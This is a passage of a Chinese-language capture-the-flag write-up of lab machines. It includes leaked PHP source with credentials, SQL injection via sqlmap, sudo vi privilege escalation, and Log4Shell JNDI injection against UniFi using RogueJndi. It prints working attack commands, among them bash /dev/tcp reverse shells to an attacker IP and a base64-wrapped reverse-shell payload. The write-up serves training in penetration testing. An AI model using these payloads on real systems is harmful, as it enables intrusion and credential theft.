class="string">&quot;orgId&quot;</span>].<span class="string">&#x27;&lt;/td&gt;&lt;td&gt;&#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;&lt;/td&gt;&lt;td&gt;&#x27;</span>.<span class="variable">$email</span>.<span class="string">&#x27;&lt;/td&gt;&lt;/tr&gt;&lt;/table&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;content&quot;</span>]===<span class="string">&quot;accounts&quot;</span>&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]!=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                                <span class="variable">$stmt</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;select access,name,email from accounts where id=?&quot;</span>);</span><br><span class="line">                                <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]);</span><br><span class="line">                                <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">                                <span class="variable">$stmt</span>=<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br><span class="line">                                <span class="variable">$stmt</span>=<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">                                <span class="variable">$id</span>=<span class="variable">$stmt</span>[<span class="string">&quot;access&quot;</span>];</span><br><span class="line">                                <span class="variable">$name</span>=<span class="variable">$stmt</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">                                <span class="variable">$email</span>=<span class="variable">$stmt</span>[<span class="string">&quot;email&quot;</span>];</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&#x27;&lt;table&gt;&lt;tr&gt;&lt;th&gt;Access ID&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&lt;/td&gt;&lt;td&gt;&#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;&lt;/td&gt;&lt;td&gt;&#x27;</span>.<span class="variable">$email</span>.<span class="string">&#x27;&lt;/td&gt;&lt;/tr&gt;&lt;/table&#x27;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                                <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;content&quot;</span>]===<span class="string">&quot;uploads&quot;</span>)</span><br><span class="line">                                &#123;</span><br><span class="line">                                        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>]===<span class="string">&quot;2233&quot;</span>)</span><br><span class="line">                                        &#123;</span><br><span class="line">                                                <span class="keyword">echo</span> <span class="string">&#x27;This action require super admin rights.&#x27;</span>;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        <span class="keyword">else</span></span><br><span class="line">                                        &#123;</span><br><span class="line">                                                <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>]===<span class="string">&quot;upload&quot;</span>)</span><br><span class="line">                                                &#123;</span><br><span class="line">                                                        <span class="variable">$target_dir</span> = <span class="string">&quot;/var/www/html/uploads/&quot;</span>;</span><br><span class="line">                                                        <span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                                                        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br><span class="line">                                                                <span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span>. <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]). <span class="string">&quot; has been uploaded.&quot;</span>;</span><br><span class="line">                                                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                                                        <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">                                                                &#125;                               &#125;<span class="keyword">else</span>&#123;  <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>db.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;robert&#x27;</span>,<span class="string">&#x27;M3g4C0rpUs3r!&#x27;</span>,<span class="string">&#x27;garage&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mysqli_connect(&#x27;hostname&#x27;, &#x27;username&#x27;, &#x27;password&#x27;, &#x27;database name&#x27;)</span></span><br></pre></td></tr></table></figure>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;guest&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$cookie_name</span> = <span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="variable">$cookie_value</span> = <span class="string">&quot;2233&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="variable">$cookie_name</span>, <span class="variable">$cookie_value</span>, <span class="title function_ invoke__">time</span>() + (<span class="number">86400</span> * <span class="number">30</span>), <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;role&#x27;</span>,<span class="string">&#x27;guest&#x27;</span>, <span class="title function_ invoke__">time</span>() + (<span class="number">86400</span> * <span class="number">30</span>), <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /cdn-cgi/login/admin.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]===<span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]===<span class="string">&quot;MEGACORP_4dm1n!!&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$cookie_name</span> = <span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="variable">$cookie_value</span> = <span class="string">&quot;34322&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="variable">$cookie_name</span>, <span class="variable">$cookie_value</span>, <span class="title function_ invoke__">time</span>() + (<span class="number">86400</span> * <span class="number">30</span>), <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;role&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>, <span class="title function_ invoke__">time</span>() + (<span class="number">86400</span> * <span class="number">30</span>), <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /cdn-cgi/login/admin.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="meta">?&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>ww-data 就先這樣，用取得的帳密嘗試切換到 robert<br>不是 index.php admin:MEGACORP_4dm1n!!<br><img src="https://hackmd.io/_uploads/HyWUBlyrJe.png" alt="image"><br>db.php robert:M3g4C0rpUs3r! 是對的<br><img src="https://hackmd.io/_uploads/ByhjhekBkg.png" alt="image"></p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>跑腳本前先嘗試一些基本指令 sodo、id<br><img src="https://hackmd.io/_uploads/BJQElbkrJx.png" alt="image"><br>發現附加群組 bugtracker<br><img src="https://hackmd.io/_uploads/Sy5de-yBye.png" alt="image"><br>發現執行檔 <code>/usr/bin/bugtracker</code><br><img src="https://hackmd.io/_uploads/SJmPXbyBkg.png" alt="image"><br>SUID 被設置、擁有者 root<br><img src="https://hackmd.io/_uploads/Syd_X-1Syx.png" alt="image"><br><img src="https://hackmd.io/_uploads/HJVC9byHyl.png" alt="image"><br>取得 root flag <code>af13b0bee69f8a877c3faf667f7beacf</code><br><img src="https://hackmd.io/_uploads/HyUgoW1Hkx.png" alt="image"></p>
+<h2 id="Vaccine"><a href="#Vaccine" class="headerlink" title="Vaccine"></a>Vaccine</h2><h3 id="Enumeration-2"><a href="#Enumeration-2" class="headerlink" title="Enumeration"></a>Enumeration</h3><p><img src="https://hackmd.io/_uploads/Bk5XtY-Byx.png" alt="image"><br>無密碼登入ftp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ ftp anonymous@10.129.75.243</span><br></pre></td></tr></table></figure>
+<p>下載 backup.zip<br><img src="https://hackmd.io/_uploads/BJX3iKZBJg.png" alt="image"><br><img src="https://hackmd.io/_uploads/HkAk3F-r1g.png" alt="image"><br>成功暴破密碼</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ zip2john backup.zip &gt; zip.hash</span><br><span class="line">└─$ john zip.hash</span><br><span class="line">...</span><br><span class="line">741852963        (backup.zip) </span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/BkCuTYbH1l.png" alt="image"><br>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="string">&quot;2cb42f8734ea607eefed3b70af13bbd3&quot;</span>) &#123;</span><br><span class="line">      <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: dashboard.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://10015.io/tools/md5-encrypt-decrypt">線上工具</a> 破解出 <code>qwerty789</code><br><img src="https://hackmd.io/_uploads/rkE1AF-ryx.png" alt="image"><br><img src="https://hackmd.io/_uploads/ByFh-5-Skg.png" alt="image"><br>登入成功<br><img src="https://hackmd.io/_uploads/BJdpWc-BJx.png" alt="image"></p>
+<h3 id="Foothold-1"><a href="#Foothold-1" class="headerlink" title="Foothold"></a>Foothold</h3><p>輸入單引號發現好像有SQLi<br><img src="https://hackmd.io/_uploads/HyxiScZHJe.png" alt="image"><br><img src="https://hackmd.io/_uploads/rJktS5-r1g.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ sqlmap -u <span class="string">&quot;http://10.129.75.243/dashboard.php?search=Sandy&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=buc7ihb0s212u9qnf41293v1p5&quot;</span></span><br></pre></td></tr></table></figure>
+<p>都選默認<br><img src="https://hackmd.io/_uploads/B1yVUcbH1e.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ sqlmap -u <span class="string">&quot;http://10.129.75.243/dashboard.php?search=Sandy&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=buc7ihb0s212u9qnf41293v1p5&quot;</span> --os-shell</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/SJDgPc-H1g.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.252/9001 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+<p>取得完整 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/H1o_r2MBJg.png" alt="image"><br>user flag <code>ec9b13ca4d6229cd5cc1e09980965bf7</code><br><img src="https://hackmd.io/_uploads/HyieB3zB1x.png" alt="image"></p>
+<h3 id="Privilege-Escalation-1"><a href="#Privilege-Escalation-1" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>之前密碼、預設密碼、空密碼都錯誤<br><img src="https://hackmd.io/_uploads/ry8BQWNHke.png" alt="image"><br>看看web root<br><img src="https://hackmd.io/_uploads/SygAf-4BJg.png" alt="image"><br>dashboard.php 找到 <code>user=postgres password=P@s5w0rd!</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] !== <span class="string">&quot;true&quot;</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$conn</span> = <span class="title function_ invoke__">pg_connect</span>(<span class="string">&quot;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">catch</span> ( exception <span class="variable">$e</span> ) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;search&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$q</span> = <span class="string">&quot;Select * from cars where name ilike &#x27;%&quot;</span>. <span class="variable">$_REQUEST</span>[<span class="string">&quot;search&quot;</span>] .<span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">pg_query</span>(<span class="variable">$conn</span>,<span class="variable">$q</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">  &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="title function_ invoke__">pg_last_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">pg_fetch_array</span>(<span class="variable">$result</span>, <span class="literal">NULL</span>, PGSQL_NUM))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">          &lt;tr&gt;</span></span><br><span class="line"><span class="string">            &lt;td class=&#x27;lalign&#x27;&gt;<span class="subst">$row</span>[1]&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;td&gt;<span class="subst">$row</span>[2]&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;td&gt;<span class="subst">$row</span>[3]&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;td&gt;<span class="subst">$row</span>[4]&lt;/td&gt;</span></span><br><span class="line"><span class="string">          &lt;/tr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$q</span> = <span class="string">&quot;Select * from cars&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">pg_query</span>(<span class="variable">$conn</span>,<span class="variable">$q</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">  &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="title function_ invoke__">pg_last_error</span>(<span class="variable">$conn</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">pg_fetch_array</span>(<span class="variable">$result</span>, <span class="literal">NULL</span>, PGSQL_NUM))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">          &lt;tr&gt;</span></span><br><span class="line"><span class="string">            &lt;td class=&#x27;lalign&#x27;&gt;<span class="subst">$row</span>[1]&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;td&gt;<span class="subst">$row</span>[2]&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;td&gt;<span class="subst">$row</span>[3]&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;td&gt;<span class="subst">$row</span>[4]&lt;/td&gt;</span></span><br><span class="line"><span class="string">          &lt;/tr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>用來登ssh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ ssh postgres@10.129.176.198 </span><br><span class="line">...</span><br><span class="line">postgres@10.129.176.198&#x27;s password: # input P@s5w0rd! </span><br><span class="line">...</span><br><span class="line">postgres@vaccine:~$ </span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/B1wjPMVByg.png" alt="image"><br>ALL &#x3D;&gt; 可以用root執行<br><img src="https://hackmd.io/_uploads/ByofI7VBJe.png" alt="image"><br><img src="https://hackmd.io/_uploads/ry5BImVS1e.png" alt="image"><br>a 失敗，要完全符合 <code>/bin/vi /etc/postgresql/11/main/pg_hba.conf</code><br>換 b</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">postgres@vaccine:~$ <span class="built_in">sudo</span> /bin/vi /etc/postgresql/11/main/pg_hba.conf</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/Skk5D7VrJx.png" alt="image"><br><img src="https://hackmd.io/_uploads/HyXiDm4SJx.png" alt="image"><br><img src="https://hackmd.io/_uploads/B1nTvm4B1e.png" alt="image"><br>取得 root flag <code>dd6e058e814260bc70e9bbdef2715849</code><br><img src="https://hackmd.io/_uploads/Hy79_XNHJl.png" alt="image"></p>
+<h2 id="Unified"><a href="#Unified" class="headerlink" title="Unified"></a>Unified</h2><h3 id="Enumeration-3"><a href="#Enumeration-3" class="headerlink" title="Enumeration"></a>Enumeration</h3><p><img src="https://hackmd.io/_uploads/H1hQBNNrkl.png" alt="image"><br><img src="https://hackmd.io/_uploads/Hke1y8Brkl.png" alt="image"><br><img src="https://hackmd.io/_uploads/rJdGJ8Br1e.png" alt="image"><br>8080是HTTP proxy，會重導向到8443<br>8443似乎是SSL web server，<code>http-title: UniFi Network</code><br><img src="https://hackmd.io/_uploads/HJkfl8Brye.png" alt="image"><br>重導向到<br><img src="https://hackmd.io/_uploads/S1KQnLrHkx.png" alt="image"><br>Unifi 版本 6.4.54 &#x3D;&gt; CVE-2021-44228<br><img src="https://hackmd.io/_uploads/Sky5n8SBkl.png" alt="image"></p>
+<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>在Burpsuite用 test:test 測試</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /api/login HTTP/1.1</span><br><span class="line">Host: 10.129.55.213:8443</span><br><span class="line">Content-Length: 68</span><br><span class="line">Sec-Ch-Ua: &quot;Not(A:Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;122&quot;</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Linux&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: https://10.129.55.213:8443</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://10.129.55.213:8443/manage/account/login?redirect=%2Fmanage</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Priority: u=1, i</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test&quot;,&quot;remember&quot;:false,&quot;strict&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+<p>經查詢，remember可以被injection <code>$&#123;jndi:ldap://&#123;Tun0 IP Address&#125;/whatever&#125;</code></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi">https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi</a></p>
+</blockquote>
+<p>在本機開ldap 389 port</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">sudo</span> tcpdump -i tun0 port 389</span><br></pre></td></tr></table></figure>
+<p>POST request 改成 <code>&quot;remember&quot;:&quot;$&#123;jndi:ldap://10.10.14.252/&#125;&quot;</code><br><img src="https://hackmd.io/_uploads/rJPctvrSJl.png" alt="image"><br>證明可被注入</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/veracode-research/rogue-jndi">RogueJndi</a> 是一個 local LDAP server，專為 JNDI 注入攻擊設計，當有漏洞的 Java JNDI API 嘗試向它 request 時，返回惡意 payload 以實現遠程代碼執行（RCE）<ul>
+<li>提供不同種 RCE payload (RemoteReference.java、Tomcat.java、Groovy.java、WebSphere2.java)</li>
+<li>用來接收目標的ldap連線並使目標執行指令</li>
+</ul>
+</li>
+</ul>
+<p>RogueJndi 用法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/RogueJndi-1.1.jar --<span class="built_in">command</span> <span class="string">&quot;[bash command]&quot;</span> --hostname <span class="string">&quot;[local IP]&quot;</span></span><br></pre></td></tr></table></figure>
+<p>先用 id 測試<br><img src="https://hackmd.io/_uploads/SkO7lpHHyx.png" alt="image"><br>POST request 改成 <code>&quot;remember&quot;:&quot;$&#123;jndi:ldap://[local IP]:1389/o=tomcat&#125;&quot;</code> 後送出，選較通用的 tomcat<br>然而 RogueJndi 沒有反應，可能是 command 執行了但不會反饋結果<br>再用reverse shell測試<br>透過base64傳送避免編碼問題</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -c bash -i &gt;&amp;/dev/tcp/[IP]/[port] 0&gt;&amp;1&#x27;</span> | <span class="built_in">base64</span></span><br></pre></td></tr></table></figure>
+<p><code>--command &quot;bash -c &#123;echo,[base64 string]&#125;| &#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</code><br>先開啟 ldap server<br><img src="https://hackmd.io/_uploads/BJ2FLkuBkl.png" alt="image"><br>send request<br><img src="https://hackmd.io/_uploads/ByueOk_ryl.png" alt="image"><br>取得shell<br><img src="https://hackmd.io/_uploads/rylzZ_1Orkg.png" alt="image"><br>升級shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash</span><br></pre></td></tr></table></figure>
+<p>在 <code>/home/michael/</code> 找到user flag <code>6ced1a6a89e666c0620cdb10262ba127</code><br><img src="https://hackmd.io/_uploads/BJoZylOByg.png" alt="image"></p>
+<h3 id="Privilege-Escalation-2"><a href="#Privilege-Escalation-2" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><ul>
+<li>UniFi 是一個網路管理平台，讓用戶可以管理和監控網絡設備，內建 MongoDB</li>
+<li>MongoDB 為 NoSQL 資料庫，類似 JSON </li>
+<li>MongoDB 在 UniFi applications 中預設運行在 27117 port<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep mongo</span><br></pre></td></tr></table></figure>
+<img src="https://hackmd.io/_uploads/SkSwQe_SJg.png" alt="image"><br>確認有 MongoDB 在 port 27117</li>
+<li>UniFi applications default database name : <code>ace</code></li>
+</ul>
+<p>用<code>db.admin.find()</code>取得admin的密碼雜湊值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo --port 27117 ace --<span class="built_in">eval</span> <span class="string">&quot;db.admin.find().forEach(printjson);&quot;</span></span><br></pre></td></tr></table></figure>
